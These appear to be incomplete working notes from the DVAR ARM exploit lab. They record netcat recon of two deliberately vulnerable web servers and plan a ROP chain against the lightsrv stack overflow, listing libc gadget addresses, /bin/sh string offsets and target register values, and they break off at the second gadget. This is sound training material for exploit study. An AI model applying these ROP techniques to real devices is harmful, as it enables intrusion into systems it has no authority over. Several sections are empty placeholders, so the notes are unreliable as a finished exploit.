Exploiting DVAR servers
--------------------------------



=============================== Recon: Legitimate servers responses ================================

------------------------------------ miniweb (port 80) ---------------------------------------------

> python -c "print 'GET / \r\n\r\n'" | nc 192.168.100.2 80
# OR python -c "print 'GET /\r\n\r\n'" | nc 192.168.100.2 80  (space after GET / optional)

HTTP/1.1 200 OK
Server: EXPLOITLAB ROP WARM-UP/2.0
Content-Length: 1056
Content-Type: text/html

<html>
<head>
<link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<h1>The ARM Exploit Laboratory</h1>
<h2>ARM STACK OVERFLOW WARM-UP EXERCISE</h2>
<p>
This is a warm-up exercise for exploiting stack overflows. The underlying web server is vulnerable to a stack overflow. Your task is to identify the input that triggers this vulnerability and write a working exploit for it.
</p>
<p>
Follow the methodology, and get a shell!
<ul>
<li>Identify the vulnerable HTTP request.
<li>Analyze the crash.
<li>Is it a stack overflow? Check registers, stack memory.
<li>Determine the offset to the Program Counter (PC).
<li>Determine the position of the stack pointer relative to the beginning of the payload.
<li>Overwrite PC precisely.
<li>Plan the payload. Where shall you place the shellcode?
<li>Search for a suitable Jump-through-Register instruction in the binary or shared libraries.
<li>Inject and return to "test shellcode" (BKPT).
<li>Prepare a final working exploit.
</ul>
</p>

<H1><a href="basic.html">START &gt&gt</a></H1>
</html>

--------------------------------------- lightsrv (port 8080) ---------------------------------------
> python -c "print 'GET / \r\n\r\n'" | nc 192.168.100.2 8080       # Space after 'GET /' mandatory

# The following is the content of '/www/docroot/index.html' file in DVAR rootfs

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1428

<!doctype html public "-//w3c//dtd html 4.0 transit
<!-- (c) THE ARM EXPLOIT LABORATORY, Saumil Shah @therealsaumil -->
<html>
<head>
<link rel="stylesheet" type="text/css" href="styles.css">
<title>Lights Control</title>
<script>
var xhr, img;

function init()
{
   xhr = createXHR();
   img = document.getElementById("signal");
}

function lights(state)
{
   xhr.open("GET", "lights/" + state, true);
   xhr.onreadystatechange = function() { handleresponse(xhr); };
   xhr.send(null);
   return;
}

function handleresponse(xhr)
{
   if(xhr.readyState == 4 && xhr.status == 200) {
      if(xhr.responseText == "ON") {
         img.src = "walk.jpg";
      }
      else {
         img.src = "dont_walk.jpg";
      }
   }
}

function createXHR()
{
   try { return new XMLHttpRequest(); } catch(e) {}
   try { return new ActiveXObject("Msxml2.XMLHTTP.6.0"); } catch (e) {}
   try { return new ActiveXObject("Msxml2.XMLHTTP.3.0"); } catch (e) {}
   try { return new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) {}
   try { return new ActiveXObject("Microsoft.XMLHTTP"); } catch (e) {}

   return null;
}
</script>
</head>
<body onload="init()" class="centrebody">
<h1>Lights Control</h1>
<div>
<img id="signal" src="dont_walk.jpg">
</div>
<div>
<button class="button-red" onclick="lights('off');">DONT<br>WALK</button> 
<button class="button-green" onclick="lights('on');">&nbsp;<br>WALK</button> 
</div>
</body>
</html>

================================= Crafting malicious HTTP request ==================================

Code segment equivalent to that which the ROP Chain intends to execute:
------------------------------------------------------------------------
   C
      
   ARM asm



Potential leads
---------------
   Possible gadgets to work out r0 from denullified value:
   -------------------------------------------------------
      - 0x0002e390 (@libc.so):   add r0, r0, #1; 
                                 bx lr; 

      - 0x0004adc4 (@libc.so):   add r0, r0, #1; 
                                 pop {r4, r5, r6, pc}; 
   
      - 0x000237c8 (@libc.so):   sub r0, r0, #0x20; 
                                 pop {r4, r5, r6, pc}; 
   
      - 0x0004d500 (@libc.so):   add r0, r3, r0; 
                                 bx lr; 

   Possible gadgets to tweak r2:
   ------------------------------
      - 0x00023fbc: andeq r2, r5, r0, lsr #4; bx lr; 

      - 0x00008704 (@libgcc_s.so): mov r2, r5; blx r3; 
      - 0x00007d3c (@libgcc_s.so): mov r2, r7; blx r3;


        0x00007d3c: mov r2, r7; blx r3; 


        0x00024100: mov r0, sp; blx r6; 


      - 0x00045364 (@libc.so):   add r2, r2, #1; 
                                 str r2, [r0, #0x44]; 
                                 mov r0, #0;
                                 pop {r4, r5, pc};

      - 0x4004fbb0 (@libc.so):	add	r2, r2, #1
                  	            str	r2, [r0, #20]
                  	            mov	r0, #0
                  	            pop	{r4, r5, r6, r7, pc}

      - 0x0004540c:                sub r2, r2, #1; 
                                   str r2, [r0, #0x44]; 
                                   bx lr; 

      - 0x4004576c:	add	r2, r3, #1
                     str	r2, [r0, #4]
                     ldrb	r0, [r3]
                     bx	lr

   Possible gadgets to get back r7 from denullified value
   -------------------------------------------------------
      - 0x00043e8c (@libc.so ):  mov r6, r0; 
                                 mov r0, r4; 
                                 blx r3;

      - 0x00041d04 (@libc.so):   add r7, r6, #1; 
                                 blx r3; 

   Possible gadgets for write SVC/SWI syscall
   --------------------------------------------
      - 0x0001fcac: svc #0; pop {r7, pc};

   Misc Useful Gadgets
   --------------------
      - Branch to specific address from stack with minimal side-effects on context
      -----------------------------------------------------------------------------
         - 0x0002139c (@libc.so):   pop {pc}          @ 0 side-effect

         - 0x00021934: (@libc.so)   pop {r4, pc}      @ 0 side-effects if r4 constant


      - Pop prepared values from the stack into registers
      ----------------------------------------------------
         - 0x4007b110 <__aeabi_cfcmple+16> (ligcc_s.so):	pop	{r0, r1, r2, r3, pc}

         - 0x00058e18 (@libc.so):     pop {r2, r3}; 
                                      bx lr;
         
         - 0x0004d7ec (@libc.so):     pop {r0, r1, r2, r3, ip, lr}; 
                                      bx lr; 

         - 0x000049e0 (@libgcc_s.so):  mov r0, r4; 
                                       pop {r3, r4, r5, r6, r7, pc}; 

         - 0x0004e5b4 (@libc.so):    pop {r4, r5, r6, lr}; 
                                     bx r3;  


   Misc useful strings
   --------------------
      #Command 
      > strings -t x /armx/DVAR/rootfs/lib/libc.so | grep /bin/sh 
      #gives out two matches for string "/bin/sh" in libc.so binary file
         1. 61797 /bin/sh
         2. 626c2 /bin/sh

====================================================================================================
                              R O P   C H A I N   C R A F T I N G
====================================================================================================

Last legitimate instructions to be executed in DVAR's lightsrv process (before buffer overflow 
triggers SIGSEGV):
   - lr has been overwritten during buffer overflow with Gadget0 address (and will keep that
   address throughout the whole ROP Chain execution)
   - Branch to Gadget0 through lr register

Pre-ROP lightsrv last instructions code
   handle_req:
   ...
   0x00011088 <+496>:   pop	{r4, r5, r6, r7, r8, lr}
-> 0x0001108c <+500>:	bx	lr

backtrace
   handle_req()
   handle_single_request()
   main()

Context result (after execution of above code)
   syscall params
      - r0 = <junk>           (write's param1,             desired value: 0x1 (STDOUT_NO))
      - r1 = <junk>           (write's param2,             desired value: &"/bin/sh")
      - r2 = <junk>           (write's param3,             desired value: 0x7 (sizeof("/bin/sh")))
      - r7 = <junk>           (svc's write syscall number, desired value: 0x04)

   other meaningful registers states
      - r4 = 0xffffffff
      - r6 = 0xffffffff
      - lr = &Gadget0 (const)
____________________________________________________________________________________________________
Gadget0 (@libc.so)
   - Essential gadget, to stitch together the whole ROP Chain when appropriate branching is not 
   provided by other gadgets.
   - Branch to Gadget1 address popped off the stack into pc.

Gadget's code
   0x0002139c :   pop {pc}

Context result
   syscall params


   other meaningful registers states
      - pc = &Gadget1
____________________________________________________________________________________________________
Gadget1 